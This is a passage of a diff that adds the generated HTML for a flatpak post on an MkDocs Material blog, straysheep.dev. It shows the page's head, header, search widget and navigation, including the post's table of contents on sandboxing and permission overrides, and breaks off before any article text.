@@ -1,0 +1,3174 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://straysheep-dev.github.io/blog/2024/05/07/simple-flatpak-flatpak/">
+      
+      
+        <link rel="prev" href="../simple-openwrt-openwrt/">
+      
+      
+        <link rel="next" href="../../08/material-microsoft-windows-windows/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>flatpak - straysheep.dev</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="flatpak - straysheep.dev" />
+<meta property="og:image" content="https://straysheep-dev.github.io/assets/images/social/blog/2024/05/07/simple-flatpak-flatpak.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://straysheep-dev.github.io/blog/2024/05/07/simple-flatpak-flatpak/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="flatpak - straysheep.dev" />
+<meta property="twitter:image" content="https://straysheep-dev.github.io/assets/images/social/blog/2024/05/07/simple-flatpak-flatpak.png" />
+</head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#flatpak" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="straysheep.dev" class="md-header__button md-logo" aria-label="straysheep.dev" data-md-component="logo">
+      
+  <img src="../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            straysheep.dev
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              flatpak
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-orange" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/straysheep-dev/straysheep-dev.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    straysheep-dev.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Main
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../license/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  License
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="straysheep.dev" class="md-nav__button md-logo" aria-label="straysheep.dev" data-md-component="logo">
+      
+  <img src="../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    straysheep.dev
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/straysheep-dev/straysheep-dev.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    straysheep-dev.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Main
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../license/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    License
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Blog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2019/07/15/-resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⭐ Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15/octicons-alert-16-aide-advanced-intrusion-detection-environment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AIDE (Advanced Intrusion Detection Environment)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2023/08/20/simple-ansible-ansible/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ansible
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/07/25/simple-ansible-ansible-molecule/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ansible Molecule
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atomic Red Team x Unix Artifacts Collector
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/19/material-dns-bind9-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BIND9 DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02/simple-bitwarden-bitwarden/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    bitwarden
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../15/material-file-tree-triage-auditd-logs-with-check-auditd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Triage auditd logs with check-auditd
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/01/20/fontawesome-solid-gears-cicd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/06/04/material-clipboard-flow-clipboard-snooping-x11-and-wayland/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clipboard Snooping (X11 and Wayland)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compile Static Binaries
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../29/octicons-terminal-16-custom-shell-profiles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Custom Shell Profiles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    flatpak
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    flatpak
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filesystem-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filesystem Locations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#app-runtime-filesystem-layout-on-the-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        App / Runtime Filesystem Layout (on the host):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#repositories" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Repositories
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Repositories">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#signing-keys-flathub" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SIgning Keys (Flathub):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-a-flatpak-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verifying a flatpak Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        General Commands
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creating-applications-to-go" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating Applications To-Go
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creating Applications To-Go">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#installing-the-local-offline-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing the Local / Offline Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flatpak-180-or-later" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flatpak 1.8.0 or later
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flatpak-prior-to-180" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flatpak prior to 1.8.0
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explore-an-application-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Explore an Application Sandbox
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore an Application Sandbox">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-chooser-portal-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File-Chooser Portal / Database
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sandbox-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sandbox Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Sandbox Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sandbox-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sandbox Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#d-bus-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        D-Bus Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#monitoring-d-bus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Monitoring D-Bus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#portals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portals
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-defined-permissions-flatpak-override" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Defined Permissions (flatpak override)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="User Defined Permissions (flatpak override)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#global-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Global Overrides
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#system-wide-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System-Wide Overrides:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-note-on-gvfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A Note On gvfs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#application-level-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Application Level Overrides:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#runtimes-and-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Runtimes and Sandboxing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-override-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Override Command
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#validating-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validating Permissions
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/08/simple-qemu-kvm-kernel-based-virtual-machine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    KVM (Kernel-based Virtual Machine)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/28/material-code-tags-check-linting-code/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linting Code
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2022/08/29/material-magnify-scan-nessus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nessus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/04/18/material-console-network-network-commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    nzyme x [ Raspberry Pi + Proxmox + Tailscale]
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../29/material-file-document-arrow-right-openscap-practical-usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenSCAP Practical Usage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../simple-openwrt-openwrt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenWrt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02/simple-pfsense-pfsense-administration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pfSense administration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../07/19/material-powershell-get-started-with-powerstig/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Get Started with PowerSTIG
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../08/13/simple-proxmox-proxmox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Proxmox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
